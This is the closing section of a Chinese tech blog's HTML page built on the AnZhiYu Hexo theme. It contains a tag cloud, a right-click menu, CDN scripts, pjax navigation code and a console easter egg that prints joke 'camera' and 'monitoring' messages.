style="font-size: 0.88rem;">Golang<sup>1</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>1</sup></a><a href="/tags/Nginx/" style="font-size: 0.88rem;">Nginx<sup>1</sup></a><a href="/tags/Spring/" style="font-size: 0.88rem;">Spring<sup>2</sup></a><a href="/tags/Spring-Cloud/" style="font-size: 0.88rem;">Spring Cloud<sup>3</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">安全<sup>11</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2022 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Johnny 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>